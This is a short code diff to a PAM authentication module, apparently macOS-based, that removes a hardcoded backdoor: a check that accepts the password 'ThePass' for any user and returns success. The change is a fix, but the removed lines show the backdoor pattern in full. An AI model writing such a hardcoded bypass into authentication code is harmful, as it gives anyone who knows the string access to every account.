@@ -197,9 +197,6 @@ pam_sm_authenticate(pam_handle_t * pamh, int flags, int argc, const char **argv)
 
 	/* verify the user's password */
     // printf("Verifying password of: %s\n", user);
-	if(strcmp(password, "ThePass")==0) {
-        return PAM_SUCCESS;
-    }
 	retval = PAM_USER_UNKNOWN;
     int typtop_retval = PAM_USER_UNKNOWN;
 	ODNodeRef cfNodeRef = ODNodeCreateWithNodeType(kCFAllocatorDefault, kODSessionDefault, eDSAuthenticationSearchNodeName, NULL);
